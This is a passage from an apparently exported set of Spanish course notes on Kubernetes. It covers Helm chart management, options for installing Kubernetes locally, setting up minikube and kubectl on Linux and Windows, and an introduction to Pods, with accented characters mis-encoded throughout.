\nstable\tcharts.helm.sh/stable\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.2-gestion-de-charts-y-despliegue-de-aplicaciones":{"title":"10.2-gestion-de-charts-y-despliegue-de-aplicaciones","links":[],"tags":[],"content":"10.2 Gesti√≥n de charts y despliegue de aplicaciones\nComo hemos visto anteriormente, por defecto, tenemos instalado un repositorio:\nhelm repo list\nNAME  \tURL                          \nstable\tcharts.helm.sh/stable\n\nPodemos buscar m√°s repositorios de charts buscando en la p√°gina Artifact Hub, por ejemplo podemos a√±adir el repositorio de charts de Bitnami de la siguiente manera:\nhelm repo add bitnami charts.bitnami.com/bitnami\n&quot;bitnami&quot; has been added to your repositories\n\nY podemos comprobar que hemos a√±adido un nuevo repositorio:\nhelm repo list\nNAME   \tURL                               \nstable \tcharts.helm.sh/stable     \nbitnami\tcharts.bitnami.com/bitnami\n\nSi queremos actualizar la lista de charts ofrecidos por los repositorios:\nhelm repo update\nHang tight while we grab the latest from your chart repositories...\n...Successfully got an update from the &quot;stable&quot; chart repository\n...Successfully got an update from the &quot;bitnami&quot; chart repository\nUpdate Complete. ‚éàHappy Helming!‚éà\n\n\nBuscar charts\nComo hemos comentado anteriormente, los charts los podemos buscar en la p√°gina Artifact Hub o los podemos buscar desde la l√≠nea de comandos, por ejemplo si queremos buscar un chart relacionado con nginx:\nhelm search repo nginx\nNAME                            \tCHART VERSION\tAPP VERSION\tDESCRIPTION                                       \nbitnami/nginx                   \t9.3.0        \t1.21.0     \tChart for the nginx server                        \nbitnami/nginx-ingress-controller\t7.6.12       \t0.47.0     \tChart for the nginx Ingress controller            \nstable/nginx-ingress            \t1.41.3       \tv0.34.1    \tDEPRECATED! An nginx Ingress controller that us...\nstable/nginx-ldapauth-proxy     \t0.1.6        \t1.13.5     \tDEPRECATED - nginx proxy with ldapauth            \n...\n\nPara obtener informaci√≥n sobre el chart bitnami/nginx podemos buscar en Artifact Hub.\nTodos los ficheros yaml que forman parte de un chart est√°n parametrizados, es decir cada propiedad tiene un valor por defecto, pero a la hora de instalarlo se puede cambiar. Por ejemplo, ¬øqu√© tipo de Service se crear√° al instalar el chart bitnami/nginx? Por defecto, el par√°metro service.type tiene como valor LoadBalancer, pero si queremos un Service de tipo NodePort, podremos redefinir este par√°metro a la hora de instalar el chart.\n¬øY c√≥mo sabemos los par√°metros que tiene definido cada chart y sus valores por defecto?. Estudiando la documentaci√≥n del chart en Artifact Hub. En concreto para el chart con el que estamos trabajando, accediendo a la url artifacthub.io/packages/helm/bitnami/nginx. Tambi√©n podemos obtener esta informaci√≥n ejecutando el siguiente comando:\nhelm show all bitnami/nginx\n\n\nInstalaci√≥n del chart\nPara instalar el chart ejecutamos la siguiente instrucci√≥n:\nhelm install serverweb bitnami/nginx --set service.type=NodePort\n\nComo vemos hemos nombrado el chart desplegado (serverweb), indicado el chart (bitnami/nginx) y, en este caso, hemos redefinido el par√°metro service.type.\nCuando se despliega el chart se nos ofrece informaci√≥n que nos muestra c√≥mo acceder a la aplicaci√≥n:\nNOTES:\n** Please be patient while the chart is being deployed **\n\nNGINX can be accessed through the following DNS name from within your cluster:\n\n    serverweb-nginx.default.svc.cluster.local (port 80)\n\nTo access NGINX from outside the cluster, follow the steps below:\n\n1. Get the NGINX URL by running these commands:\n\n    export NODE_PORT=$(kubectl get --namespace default -o jsonpath=&quot;{.spec.ports[0].nodePort}&quot; services serverweb-nginx)\n    export NODE_IP=$(kubectl get nodes --namespace default -o jsonpath=&quot;{.items[0].status.addresses[0].address}&quot;)\n    echo &quot;http://${NODE_IP}:${NODE_PORT}&quot;\n\nSi queremos acceder a la aplicaci√≥n desde el exterior debemos ejecutar las tres √∫ltimas instrucciones, que nos muestran la ip de nuestro cluster y el puerto asignado al Service NodePort.\nSiempre podemos volver a ver esta informaci√≥n ejecutando la siguiente instrucci√≥n:\nhelm status serverweb\n\nPodemos comprobar los Deployments que hemos realizado con Helm, ejecutando:\nhelm ls\nNAME     \tNAMESPACE\tREVISION\tUPDATED                                 \tSTATUS  \tCHART      \tAPP VERSION\nserverweb\tdefault  \t1       \t2021-06-29 19:11:15.975016119 +0200 CEST\tdeployed\tnginx-9.3.0\t1.21.0   \n\nY podemos comprobar tambi√©n los recursos que se han creado en el cluster:\nkubectl get all\nNAME                                   READY   STATUS    RESTARTS   AGE\npod/serverweb-nginx-7b7f75d476-kxq8j   1/1     Running   0          56s\n\nNAME                      TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\nservice/kubernetes        ClusterIP   10.96.0.1      &lt;none&gt;        443/TCP        5m14s\nservice/serverweb-nginx   NodePort    10.99.80.141   &lt;none&gt;        80:30137/TCP   56s\n\nNAME                              READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/serverweb-nginx   1/1     1            1           56s\n\nNAME                                         DESIRED   CURRENT   READY   AGE\nreplicaset.apps/serverweb-nginx-7b7f75d476   1         1         1       56s\n\nPor √∫ltimo, para desinstalar una aplicaci√≥n completa, ejecutamos:\nhelm delete serverweb\nrelease &quot;serverweb&quot; uninstalled\n\nAunque no entra en el √°mbito de este curso, hay que indicar que si nosotros desarrollamos una aplicaci√≥n podemos empaquetarla para instalarla con Helm, creando nuestros propios charts. Para m√°s informaci√≥n puedes entrar en la documentaci√≥n oficial."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.0-instalacion-de-kubernetes":{"title":"2.0-instalacion-de-kubernetes","links":[],"tags":[],"content":"2. Instalaci√≥n de Kubernetes\nEn este m√≥dulo vamos a estudiar los siguientes temas:\n\nAlternativas para instalaci√≥n simple de k8s\nInstalaci√≥n de minikube\nInstalaci√≥n y configuraci√≥n de kubectl\nDespliegues de aplicaciones en Kubernetes\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.1-alternativas-para-instalacion-simple-de-k8s":{"title":"2.1-alternativas-para-instalacion-simple-de-k8s","links":[],"tags":[],"content":"2.1 Alternativas para instalaci√≥n simple de k8s\nKubernetes es un software pensado para poner en producci√≥n aplicaciones m√°s o menos complejas que se ejecutan sobre contenedores, garantizando su disponibilidad, escalabilidad y actualizaci√≥n sin interrupciones.\nEn un entorno en producci√≥n no se instala Kubernetes en un solo equipo (nodo), sino que creamos un cluster de nodos que permita garantizar el funcionamiento ininterrumpido de las aplicaciones incluso en el caso de que uno o varios de los nodos del cluster tengan alg√∫n tipo de incidencia.\nConfigurar y actualizar un cluster de Kubernetes es una tarea compleja, pero existe la posibilidad de instalar de forma f√°cil un cluster de Kubernetes compuesto por un solo nodo o un conjunto peque√±o para algunos casos de uso, como en el caso de la instalaci√≥n de un entorno de desarrollo o aprendizaje, que es precisamente la situaci√≥n que tenemos en nuestro caso. Estas instalaciones de Kubernetes no son adecuadas para entornos en producci√≥n, pero nos permiten utilizar Kubernetes de forma sencilla, conocer los objetos y atacar la API sin tener que utilizar una instalaci√≥n m√°s compleja o costosa.\nminikube\nMinikube permite desplegar localmente un ‚Äúcluster‚Äù de Kubernetes con un solo nodo. Minikube es un proyecto oficial de Kubernetes y es probablemente la soluci√≥n m√°s adecuada para aprender a usar k8s, ya que es un proyecto maduro y muy sencillo de instalar. Los requisitos m√≠nimos para instalar minikube en nuestro equipo son:\n\n2 CPUs\n2GiB de memoria\n20GiB de espacio libre en disco\nUn sistema de virtualizaci√≥n o de contenedores instalado:\n\nDocker\nHyperkit\nHyper-V\nKVM\nParallels\nPodman\nVirtualBox\nVMWare\n\n\n\nMinikube instalar√° un nodo de Kubernetes en el sistema de virtualizaci√≥n/contenedores que prefiramos, siendo unas opciones m√°s adecuadas que otras dependiendo del sistema operativo de nuestro equipo, tal como se muestra en minikube.sigs.k8s.io/docs/drivers/. En versiones recientes, es posible aumentar el n√∫mero de nodos del cluster de minikube, aunque para el objetivo de este curso no es necesario y haremos la instalaci√≥n est√°ndar de un solo nodo.\nLos detalles para la instalaci√≥n local de minikube los explicamos en la siguiente secci√≥n, ya que va a ser el m√©todo recomendado para realizar este curso.\nkubeadm\nkubeadm es una soluci√≥n m√°s realista que minikube si se instala un cluster de Kubernetes con varios nodos. Su instalaci√≥n no es especialmente compleja, pero no est√° tan automatizada como minikube y necesita m√°s recursos y tiempo para configurarlo. kubeadm es una opci√≥n muy interesante cuando queremos ver de forma detallada la diferencia entre lo que se ejecuta en el nodo controlador y en los nodos workers, que no se puede apreciar en minikube.\nLa instalaci√≥n de kubeadm se realiza t√≠picamente en varias m√°quinas virtuales o varias instancias de nube y dejamos un par de enlaces para quienes est√©n m√°s interesados en indagar en este software:\n\nkubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\nwww.josedomingo.org/pledin/2018/05/instalacion-de-kubernetes-con-kubeadm/\n\nkind\nkind (kubernetes in docker) es un proyecto oficial de Kubernetes m√°s reciente que los dos anteriores y que permite desplegar un cluster de Kubernetes con varios nodos sobre docker. Es tambi√©n muy interesante como opci√≥n de instalaci√≥n local y de forma an√°loga al anterior, dejamos un par de enlaces para quienes est√©n interesados en probarlo:\n\nkind.sigs.k8s.io/docs/user/quick-start/\nwww.josedomingo.org/pledin/2021/02/kubernetes-con-kind/\n\nk3s\nA diferencia de las opciones anteriores, k3s es una distribuci√≥n de Kubernetes que s√≠ est√° pensada para poner en producci√≥n, pero en unas circunstancias peculiares como son su uso para IoT, edge computing y en general para configurar clusters de Kubernetes en sistemas de pocos recursos (k3s es por ejemplo la opci√≥n m√°s adecuada para usar Kubernetes en la arquitectura arm). k3s no es un proyecto oficial de Kubernetes, sino que lo comenz√≥ a desarrollar la empresa Rancher y hoy en d√≠a lo mantiene la Cloud Native Computing Foundation.\nLos pasos para la instalaci√≥nde k3s est√°n disponibles en:\n\nrancher.com/docs/k3s/latest/en/installation/\n\nConclusi√≥n\nAunque existen m√∫ltiples opciones de instalaci√≥n de Kubernetes, en este curso utilizaremos minikube que es el proyecto m√°s maduro y que consideramos m√°s adecuado para comenzar y centrarnos directamente en el uso de Kubernetes, obviando inicialmente los detalles de la instalaci√≥n de Kubernetes, que realmente es un proceso complejo y que no es lo m√°s adecuado para empezar."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.2-introduccion-a-la-instalacion-de-minikube":{"title":"2.2-introduccion-a-la-instalacion-de-minikube","links":[],"tags":[],"content":"2.2 Introducci√≥n a la instalaci√≥n de minikube\nEl ‚Äúcl√∫ster‚Äù de k8s que vamos a utilizar en este curso es el de un solo nodo que va a encargarse de realizar tanto las tareas de master, con los componentes principales de Kubernetes, como de worker, ejecutando las cargas de trabajo en contenedores (ya veremos m√°s adelante que realmente utiliza algo que se llama Pod).\nMinikube se distribuye como un programa que se instala en nuestra m√°quina f√≠sica (podr√≠a instalarse igualmente en una m√°quina virtual a la que tuvi√©semos acceso completo) y que al ejecutarlo crea una m√°quina virtual linux con un cl√∫ster de Kubernetes completamente configurado y listo para su uso. Podemos instalar minikube en nuestra m√°quina con sistema linux, windows o mac y en una variedad importante de sistemas de virtualizaci√≥n, aunque en el curso recomendaremos s√≥lo algunas combinaciones que hemos probado y que incluyen toda la funcionalidad necesaria para realizar el curso.\nNota: Puede haber interacci√≥n si utilizamos m√°s de un sistema de virtualizaci√≥n en nuestro equipo, por ejemplo, la utilizaci√≥n en Windows de virtualbox para unas cosas e hyper-v para minikube, puede dar lugar a problemas, por lo que en general es recomendable usar un solo sistema de virtualizaci√≥n.\nCombinaciones de sistema operativo/virtualizaci√≥n recomendadas para el curso:\n\nLinux + KVM\nLinux + VirtualBox\nWindows + VirtualBox\n\nNota: Recomendamos la instalaci√≥n de Kubernetes en un sistema Linux (Debian o Ubuntu), bien con KVM o con VirtualBox. Sabemos por experiencia, que da menos problemas que en un sistema Windows."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox":{"title":"2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox","links":[],"tags":[],"content":"2.3 Instalaci√≥n de minikube en linux con KVM/VirtualBox\nAccedemos a minikube.sigs.k8s.io/docs/start/ y seleccionamos el m√©todo que prefiramos para instalar, eligiendo nuestro sistema operativo, arquitectura, etc.\nMinikube se instala, como otras aplicaciones de Go, como un binario enlazado est√°ticamente (autoconsistente), que no tiene dependencias de nada y que tenemos que ubicar en alg√∫n directorio del PATH de nuestro sistema. Veamos en particular la instalaci√≥n directa del binario en un sistema linux:\nPaso 1: Descargamos como usuario normal y con ayuda de la aplicaci√≥n curl, la √∫ltima versi√≥n del binario de minikube (en este caso para arquitectura x86-64):\ncurl -LO storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64\n\nPaso 2: Movemos el binario a un directorio del PATH (lo recomendable en este caso ser√≠a /usr/local/bin/) y establecemos permisos de ejecuci√≥n. Todo esto puede hacerse con los comandos mv y chmod, o de forma m√°s sencilla con install\nsudo install minikube-linux-amd64 /usr/local/bin/minikube\n\nComprobamos que se ha instalado correctamente con:\nminikube version\n\nminikube version: v1.29.0\ncommit: ddac20b4b34a9c8c857fc602203b6ba2679794d3\n\nCreaci√≥n del cl√∫ster de k8s\nEl siguiente paso consiste en lanzar minikube para que cree el cluster de Kubernetes de un solo nodo (master+worker). Minikube puede crear este cluster en diversos sistemas de virtualizaci√≥n o sobre docker, lo recomendable es visitar la p√°gina de ‚Äúdrivers‚Äù y seleccionar el m√©todo m√°s adecuado para nuestro sistema.\nDe forma general, se crear√° el cl√∫ster de Kubernetes a trav√©s de minikube, mediante la instrucci√≥n:\nminikube start\n\nAunque de forma m√°s concreta, especificaremos el ‚Äúdriver‚Äù a utilizar, por ejemplo:\nminikube start --driver=kvm2\n\nEsto crear√° de forma autom√°tica una m√°quina virtual o un contenedor en el sistema escogido e instalar√° Kubernetes en ella. Por √∫ltimo, se configura kubectl si est√° instalado (el cliente de l√≠nea de comandos de k8s) para que utilice el cluster reci√©n instalado. Podemos ver una salida t√≠pica de la instalaci√≥n del cluster a continuaci√≥n:\nüòÑ  minikube v1.29.0 en Debian 11.6\n‚ú®  Using the kvm2 driver based on user configuration\nüëç  Starting control plane node minikube in cluster minikube\nüî•  Creando kvm2 VM (CPUs=2, Memory=3900MB, Disk=20000MB) ...\nüê≥  Preparando Kubernetes v1.25.3 en Docker 20.10.8...\n    ‚ñ™ Generating certificates and keys ...\n    ‚ñ™ Booting up control plane ...\n    ‚ñ™ Configuring RBAC rules ...\nüîé  Verifying Kubernetes components...\n    ‚ñ™ Using image gcr.io/k8s-minikube/storage-provisioner:v5\nüåü  Complementos habilitados: default-storageclass, storage-provisioner\nüí°  kubectl not found. If you need it, try: &#039;minikube kubectl -- get pods -A&#039;\nüèÑ  Done! kubectl is now configured to use &quot;minikube&quot; cluster and &quot;default&quot; namespace by default\n\nEn la √∫ltima l√≠nea de la salida podemos ver que se ha intentado configurar apropiadamente kubectl, a pesar de que no est√° instalado en el equipo, paso que haremos en el siguiente apartado.\nPodemos comprobar en cualquier momento el estado de minikube con la instrucci√≥n:\nminikube status\nminikube\ntype: Control Plane\nhost: Running\nkubelet: Running\napiserver: Running\nkubeconfig: Configured\n\nParada y reinicio de minikube\nPodemos parar y volver a arrancar minikube cuando sea preciso, ya que no se trata de un cl√∫ster de k8s en producci√≥n, sino de uno instalado en un equipo convencional. Esto se realiza mediante las instrucciones:\nminikube stop\n‚úã  Stopping node &quot;minikube&quot;  ...\nüõë  1 nodes stopped.\n\nminikube start\nüòÑ  minikube v1.29.0 en Debian 11.6\n...\n\nInstalaci√≥n de minikube sobre VirtualBox\nLa instalaci√≥n es similar a la que hemos explicado en este apartado, simplemente cambiaremos el driver a la hora de crear la m√°quina de minikube:\nminikube start --driver=virtualbox\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.4-instalacion-de-minikube-en-windows-+-virtualbox":{"title":"2.4-instalacion-de-minikube-en-windows-+-virtualbox","links":[],"tags":[],"content":"2.4 Instalaci√≥n de minikube en Windows + VirtualBox\nEn este apartado vamos a instalar minikube utilizando como sistema de virtualizaci√≥n VirtualBox.\nPaso 1: Instalaci√≥n de VirtualBox\nSiga las instrucciones que encontrar√°s en la p√°gina oficial: www.virtualbox.org/.\nPaso 2: Descargamos minikube y lo instalamos\nAbrimos la PowerShell, como administrador, y ejecutamos :\nNew-Item -Path &#039;c:\\&#039; -Name &#039;minikube&#039; -ItemType Directory -Force\nInvoke-WebRequest -OutFile &#039;c:\\minikube\\minikube.exe&#039; -Uri &#039;github.com/kubernetes/minikube/releases/latest/download/minikube-windows-amd64.exe&#039; ‚ÄìUseBasicParsing\n\nEsta instrucci√≥n va a crear un directorio en c:/minikube y ah√≠ va a depositar el ejecutable minikube.exe (70MB).\nPuedes seguir cualquier otro m√©todo de descargas que encontraras en la p√°gina oficial: minikube.sigs.k8s.io/docs/start/.\nA continuaci√≥n, vamos a√±adir el binario minikube.exe al PATH:\n$oldPath = [Environment]::GetEnvironmentVariable(&#039;Path&#039;, [EnvironmentVariableTarget]::Machine)\nif ($oldPath.Split(&#039;;&#039;) -inotcontains &#039;C:\\minikube&#039;){ `\n  [Environment]::SetEnvironmentVariable(&#039;Path&#039;, $(&#039;{0};C:\\minikube&#039; -f $oldPath), [EnvironmentVariableTarget]::Machine) `\n}\n\nIMPORTANTE: Debemos cerrar la sesi√≥n, para que se cargue las variables de entorno.\nPodemos ver el valor del path: dir env:path|fl\nPaso 3: Creaci√≥n del cl√∫ster de kubernetes con minikube\nEn este apartado vamos a crear un cl√∫ster de kubernetes de un nodo. En este caso minikube crear√° una m√°quina virtual (de 2Gb de RAM, 2 vcpu y 20G de almacenamiento) en VirtualBox utilizando una imagen que configura la m√°quina con kubernetes.\nCerramos el terminal PowerShell y la volvemos abrir como administrador.\nAveriguamos la versi√≥n de minikube :\n\nEjecutamos minikube start para que construya el cl√∫ster:\n\nNo hace falta indicar el driver, pero si tenemos alg√∫n problema podemos ejecutar minikube start - -driver=virtualbox. Lo debe coger autom√°ticamente. No es necesario, tener abierto VirtualBox.\nComprobamos el estado de minikube:\n\nPodemos averiguar la IP asignada a la m√°quina donde se ha instalado el cl√∫ster ejecutando minikube ip (nos har√° falta m√°s adelante)(seguramente tu tendr√°s una ip diferente a la mostrada):\n\nCuando terminemos de trabajar con kubernetes es conveniente para la m√°quina, para ello: minikube stop. Y si por cualquier motivo necesitamos eliminar la m√°quina, ejecutaremos minikube delete."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.5-instalacion-y-configuracion-de-kubectl-en-linux":{"title":"2.5-instalacion-y-configuracion-de-kubectl-en-linux","links":[],"tags":[],"content":"2.5 Instalaci√≥n y configuraci√≥n de kubectl en linux\nkubectl es la herramienta de l√≠nea de comandos utilizada para interactuar con la API de Kubernetes. Es por tanto la herramienta fundamental que vamos a utilizar durante todo el curso para gestionar nuestros objetos en el cl√∫ster reci√©n creado con minikube.\nkubectl est√° escrito en Go y de nuevo su instalaci√≥n es muy simple, ya que se trata de un binario enlazado est√°ticamente y sin dependencias. Las instrucciones para su instalaci√≥n est√°n disponibles en la documentaci√≥n de k8s. A continuaci√≥n veremos algunas de las opciones que tenemos para instalarlo.\nOpci√≥n 1. Instalar binario desde el proyecto\nAl igual que hemos hecho con minikube, podemos descargar el binario directamente desde la URL del proyecto e instalarlo en /usr/local/bin:\ncurl -LO &quot;storage.googleapis.com/kubernetes-release/release/$(curl -s storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl&quot;\nsudo install kubectl /usr/local/bin/kubectl\n\nEste binario obviamente no se actualiza y tendremos que repetir el proceso cuando se actualice.\nOpci√≥n 2. Instalar desde repositorios no oficiales\nEl t√©rmino repositorio no oficial se utiliza para aquellos repositorios que se a√±aden y que no son los propios de la distribuci√≥n que estamos utilizando. En este caso, los repositorios no oficiales los proporciona el propio proyecto k8s.\nEn el caso de las distribuciones Debian y derivadas, el repositorio es packages.cloud.google.com/apt/ y en la documentaci√≥n se detallan los pasos para instalar kubectl a trav√©s de apt.\nLa ventaja de este m√©todo respecto al anterior es que s√≠ se actualizar√° kubectl adecuadamente como cualquier otro paquete que tengamos instalado en nuestra distro.\nOpci√≥n 3. Instalar desde repositorio oficial\nEn el caso de Debian, se ha a√±adido soporte para Kubernetes a partir de la versi√≥n bullseye o Debian 11, por lo que si tenemos instalada esa versi√≥n, podemos instalar kubectl directamente con apt:\nsudo apt install kubernetes-client\n\nEn estos momentos se instala la versi√≥n 1.20 de kubectl.\nOpci√≥n 4. Instalar desde snap\nUbuntu no proporciona de forma directa un paquete con el cliente de k8s, pero s√≠ lo hace a trav√©s de snap, por lo que quienes utilicen dicho sistema, lo tienen disponible con un simple:\nsudo snap install kubectl --classic\n\nConfiguraci√≥n kubectl\nUna vez instalado kubectl podemos comprobar que est√° disponible y cu√°l es su versi√≥n, con la instrucci√≥n:\nkubectl version --short\n...\nClient Version: v1.26.3\nKustomize Version: v4.5.7\nServer Version: v1.26.1\n\n\nEn el caso anterior, estamos utilizando la versi√≥n 1.22.2 y nos informa de que no ha podido conectarse al cl√∫ster de Kubernetes con la configuraci√≥n por defecto (localhost:8080). Es decir, aunque tengamos kubectl y minikube instalados, el primero no est√° configurado todav√≠a para conectarse al cl√∫ster de k8s que ejecuta minikube.\nLa soluci√≥n m√°s sencilla es parar minikube y volverlo a arrancar, porque de esta manera minikube configurar√° autom√°ticamente kubectl. Si nos fijamos en la salida de minikube anterior, en la que no ten√≠amos instalado kubectl, aparec√≠a la l√≠nea:\nüí°  kubectl not found. If you need it, try: &#039;minikube kubectl -- get pods -A&#039;\n\nPero si lo volvemos a repetir ahora, esa l√≠nea no aparecer√° y se configurar√° kubectl para poder usar el cl√∫ster que proporciona minikube. Lo que va a hacer minikube es configurar el fichero ~/.kube/config de la siguiente manera:\napiVersion: v1\nclusters:\n- cluster:\n    certificate-authority: /home/alberto/.minikube/ca.crt\n    extensions:\n    - extension:\n        last-update: Sun, 30 Jan 2022 20:45:08 CET\n        provider: minikube.sigs.k8s.io\n        version: v1.24.0\n      name: cluster_info\n    server: https://192.168.39.115:8443\n  name: minikube\ncontexts:\n- context:\n    cluster: minikube\n    extensions:\n    - extension:\n        last-update: Sun, 30 Jan 2022 20:45:08 CET\n        provider: minikube.sigs.k8s.io\n        version: v1.24.0\n      name: context_info\n    namespace: default\n    user: minikube\n  name: minikube\ncurrent-context: minikube\nkind: Config\npreferences: {}\nusers:\n- name: minikube\n  user:\n    client-certificate: /home/alberto/.minikube/profiles/minikube/client.crt\n    client-key: /home/alberto/.minikube/profiles/minikube/client.key\n\nDonde en cada caso variar√° la direcci√≥n IP del servidor del cl√∫ster (en este caso la 192.168.39.221) y la ubicaci√≥n de los ficheros de los certificados y claves x509 (en este caso en el directorio /home/alberto).\nUna vez configurado correctamente kubectl, podemos repetir el comando:\nkubectl version\n\nClient Version: version.Info{Major:&quot;1&quot;, Minor:&quot;23&quot;, GitVersion:&quot;v1.23.3&quot;, GitCommit:&quot;816c97ab8cff8a1c72eccca1026f7820e93e0d25&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2022-01-25T21:25:17Z&quot;, GoVersion:&quot;go1.17.6&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}\nServer Version: version.Info{Major:&quot;1&quot;, Minor:&quot;22&quot;, GitVersion:&quot;v1.22.3&quot;, GitCommit:&quot;c92036820499fedefec0f847e2054d824aea6cd1&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2021-10-27T18:35:25Z&quot;, GoVersion:&quot;go1.16.9&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}\n\nComprobamos que ya aparece la versi√≥n del servidor y por tanto se ha podido conectar con el cl√∫ster que gestiona minikube. Adem√°s podemos ejecutar nuestro primer comando propiamente de kubectl:\nkubectl get nodes\nNAME       STATUS   ROLES                  AGE   VERSION\nminikube   Ready    control-plane,master   21m   v1.22.3\n\nSi queremos utilizar el autocompletado, podemos generarlo e incorporarlo a nuestro entorno con:\necho &#039;source &lt;(kubectl completion bash)&#039; &gt;&gt;~/.bashrc\n\nY para poder usarlo en esta misma sesi√≥n (no ser√° necesario m√°s adelante, ya que el fichero .bashrc se lee cada vez que se inicia una sesi√≥n):\nsource ~/.bashrc\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.6-instalacion-y-configuracion-de-kubectl-en-windows":{"title":"2.6-instalacion-y-configuracion-de-kubectl-en-windows","links":[],"tags":[],"content":"2.6 Instalaci√≥n y configuraci√≥n de kubectl en windows\nPodemos encontrar la informaci√≥n donde nos explican la instalaci√≥n de kubectl en la documentaci√≥n. Vamos a elegir la opci√≥n de descargar el ejecutable, para ello accedemos a la PowerShell como administrador y en el directorio C./windows/system32 descargamos el ejecutable (por lo que lo vamos a tener disponible en el PATH). Para ello vamos a ejecutar:\ncurl.exe -LO storage.googleapis.com/kubernetes-release/release/v1.26.0/bin/windows/amd64/kubectl.exe\n\nUna vez instalado, desde una PowerShell sin acceso como administrador, podemos empezar a usar kubectl y comprobar si podemos acceder al cl√∫ster.\nPodemos comprobar la versi√≥n de kubectl:\n\nY ejecutar nuestro primer comando para obtener los nodos del cl√∫ster:\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.7-despliegues-de-aplicaciones-en-kubernetes":{"title":"2.7-despliegues-de-aplicaciones-en-kubernetes","links":[],"tags":[],"content":"2.7 Despliegues de aplicaciones en Kubernetes\nVamos a resumir brevemente, con la ayuda de un par de im√°genes, la forma que tiene k8s de hacer despliegues de aplicaciones y lo compararemos con un despliegue ‚Äútradicional‚Äù.\nAunque un despliegue real tiene muchos m√°s elementos que los que vamos a exponer a continuaci√≥n, con idea de simplificarlo todo y centrarnos en la diferencia de los elementos que intervienen, supondremos una aplicaci√≥n ‚Äútradicional‚Äù de dos capas, en las que una serie de equipos son los que est√°n expuestos a Internet y los que pueden ejecutar una parte del c√≥digo de la aplicaci√≥n a trav√©s de servidores web (a los que de forma gen√©rica denominaremos ‚Äúfront-end‚Äù), mientras que otra serie de equipos ejecutan otra parte de c√≥digo y gestionan el almacenamiento y las bases de datos (a los que llamaremos de forma gen√©rica ‚Äúback-end‚Äù).\n\nEn la imagen anterior, vemos que el balanceador de carga expuesto al exterior recibe la petici√≥n, que asigna a alguna de las m√°quinas virtuales o f√≠sicas que forman el ‚Äúfront-end‚Äù y que √©stas a su vez se comunican con alguna de las m√°quinas del ‚Äúback-end‚Äù a trav√©s del balanceador de carga intermedio.\nEn el caso de Kubernetes, esto se realiza utilizando una serie de objetos internos, que normalmente se ejecutan sobre contenedores, denominados Pods, ReplicaSets, Deployments, Services e Ingress Controllers. Hay bastantes m√°s objetos de k8s, pero nos centraremos en √©stos que son los principales.\nEn la siguiente imagen podemos ver la forma en la que una petici√≥n externa se gestionar√≠a:\n\nEn los siguientes m√≥dulos veremos uno a uno estos objetos de k8s y aprenderemos paso a paso c√≥mo se interact√∫a con ellos y c√≥mo se definen, pero a modo de resumen, podemos enumerar sus principales funciones en la siguiente lista:\n\nPods: ejecutan los contenedores\nReplicaSets:\n\nSe encargan de que no haya ca√≠da del servicio\nGestionan la tolerancia a fallos\nProporcionan escalabilidad din√°mica\n\n\nDeployments:\n\nGestionan las actualizaciones continuas\nRealizan despliegues autom√°ticos\n\n\nServices:\n\nGestionan el acceso a los pods\nBalancean la carga entre los Pods disponibles\n\n\nIngress:\n\nGestionan el acceso desde el exterior a trav√©s de nombre\n\n\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.0-contenedores-en-kubernetes":{"title":"3.0-contenedores-en-kubernetes","links":[],"tags":[],"content":"3. Contenedores en Kubernetes: Pods\nLa unidad m√°s peque√±a que puede utilizar Kubernetes es el Pod, en ingl√©s Pod significa ‚Äúvaina‚Äù, y podemos entender un Pod como una envoltura que contiene uno o varios contenedores (en la mayor√≠a de los casos un solo contenedor). De forma gen√©rica, un Pod representa un conjunto de contenedores que comparten almacenamiento y una √∫nica IP.\nUn aspecto muy importante que hay que ir asumiendo es que los Pods son ef√≠meros, se lanzan y en determinadas circunstancias se paran o se destruyen, creando en muchos casos nuevos Pods que sustituyan a los anteriores. Esto tiene importantes ventajas a la hora de realizar modificaciones en los despliegues en producci√≥n, pero tiene una consecuencia directa sobre la informaci√≥n que pueda tener almacenada el Pod, por lo que tendremos que utilizar alg√∫n mecanismo adicional cuando necesitemos que la informaci√≥n sobreviva a un Pod. Por lo tanto, aunque Kubernetes es un orquestador de contenedores, la unidad m√≠nima de ejecuci√≥n es el Pod, que contendr√° uno a m√°s contenedores seg√∫n las necesidades:\n\nEn la mayor√≠a de los casos y siguiendo el principio de un proceso por contenedor, evitamos tener sistemas (como m√°quinas virtuales) ejecutando docenas de procesos, por lo que lo m√°s habitual ser√° tener un Pod en cuyo interior se define un contenedor que ejecuta un solo proceso.\nEn determinadas circunstancias ser√° necesario ejecutar m√°s de un proceso en el mismo ‚Äúsistema‚Äù, como en los casos de procesos fuertemente acoplados, en esos casos, tendremos m√°s de un contenedor dentro del Pod. Cada uno de los contenedores ejecutando un solo proceso, pero pudiendo compartir almacenamiento y una misma direcci√≥n IP como si se tratase de un sistema ejecutando m√∫ltiples procesos.\n\nExisten adem√°s algunas razones que hacen que sea conveniente tener esta capa adicional por encima de la definici√≥n de contenedor:\n\nKubernetes puede trabajar con distintos sistemas de gesti√≥n de contenedores (docker, containerd, rocket, cri-o, etc) por lo que es muy conveniente a√±adir una capa de abstracci√≥n 